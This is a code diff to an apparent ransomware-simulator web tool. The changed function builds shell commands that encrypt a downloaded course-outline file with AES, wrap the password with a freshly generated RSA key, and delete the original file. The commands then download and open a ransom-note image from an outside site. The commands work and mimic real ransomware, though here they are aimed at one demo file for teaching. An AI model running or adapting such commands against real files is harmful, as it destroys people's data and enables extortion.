@@ -158,13 +158,22 @@ function buildTerminalCommands(password) {
   const secret = shellQuote(password);
   const input = `"$HOME/Downloads/${COURSE_OUTLINE_FILE}"`;
   const temporaryOutput = `"$HOME/Downloads/${COURSE_OUTLINE_FILE}.enc"`;
+  const encryptedKeyOutput = `"$HOME/Downloads/${COURSE_OUTLINE_FILE}.key.enc"`;
+  const publicKey = '"$HOME/Downloads/public.pem"';
   const ransomNoteOutput = '"$HOME/Downloads/RANSOMNOTE.png"';
 
   return {
     checkCommand: 'openssl version',
     protectCommands: [
-  `openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:${secret} -in ${input} -out ${temporaryOutput} && test -s ${temporaryOutput} || { rm -f ${temporaryOutput}; echo "ENCRYPTION FAILED"; exit 1; } &&rm -f ${input} &&curl -fL 'https://ransomware-simulator-self.vercel.app/ransomnoteimage.png' -o ${ransomNoteOutput} && open ${ransomNoteOutput}`,
-]
+      `openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$HOME/Downloads/privatekey(given_after_ransom).pem" >/dev/null 2>&1 && \
+openssl rsa -pubout -in "$HOME/Downloads/privatekey(given_after_ransom).pem" -out ${publicKey} >/dev/null 2>&1 && \
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:${secret} -in ${input} -out ${temporaryOutput} && \
+printf '%s' ${secret} | openssl pkeyutl -encrypt -pubin -inkey ${publicKey} -out ${encryptedKeyOutput} && \
+test -s ${temporaryOutput} && test -s ${encryptedKeyOutput} || { rm -f ${temporaryOutput} ${encryptedKeyOutput}; echo "ENCRYPTION FAILED"; exit 1; } && \
+rm -f ${input} ${publicKey}&& \
+curl -fL 'https://ransomware-simulator-self.vercel.app/ransomnoteimage.png' -o ${ransomNoteOutput} && \
+open ${ransomNoteOutput}`
+    ]
   };
 }
 
